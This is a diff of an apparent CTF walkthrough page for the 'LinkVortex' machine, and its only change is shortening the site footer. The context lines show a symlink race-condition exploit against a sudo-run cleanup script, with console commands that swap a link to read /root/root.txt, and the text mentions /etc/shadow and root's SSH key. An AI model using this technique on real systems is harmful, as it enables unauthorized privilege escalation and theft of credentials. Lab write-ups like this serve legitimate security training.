@@ -135,6 +135,4 @@ to move it to the quarantine directory. Because the script does not verify if th
 link changes before execution, we can exploit a race condition to get root.txt
 (or any file on the machine, e.g. <code>/etc/shadow</code> or root&rsquo;s private SSH key):</p><ol><li>make sure <code>$CHECK_CONTENT</code> is set so the content of the file will be printed on standard output after quaratining the symbolic link</li><li>Change sleep period based on the actual load on the cpu of the machine.</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>bob@linkvortex:~$ ln -sf /home/bob/user.txt target.png
 </span></span><span style=display:flex><span>bob@linkvortex:~$ (CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh *.png) &amp; (sleep 0.06 &amp;&amp; ln -sf /root/root.txt target.png) 
-</span></span></code></pre></div></div></div></main></div><footer class=footer><span>© 2025 alfa7i7, Built with
-<a href=https://gohugo.io class=footerLink>Hugo</a> and
-<a href=https://github.com/LordMathis/hugo-theme-nightfall class=footerLink>Nightfall</a> theme</span></footer></div></body></html>
+</span></span></code></pre></div></div></div></main></div><footer class=footer><span>© 2025 alfa7i7</span></footer></div></body></html>
